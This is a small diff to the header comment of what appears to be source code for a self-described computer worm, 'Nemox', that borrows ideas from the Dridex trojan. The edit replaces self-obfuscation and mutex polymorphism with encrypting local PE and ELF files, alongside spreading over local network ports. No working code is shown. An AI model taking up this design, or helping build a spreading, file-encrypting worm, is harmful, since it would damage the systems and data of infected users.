@@ -10,8 +10,7 @@
 ;   The Nemox computer worm will feature some concepts
 ;   borrowed from the Dridex trojan such as:
 ;       - Spreading via local Network Ports
-;       - Self-obfuscation while runtime
-:       - Polymorphism via mutex naming
+;       - Encrypting local PE and ELF files
 ;    This is everything... Yeah! Nemox is meant to be 
 ;    simple but aggressive as hell...
 ;    
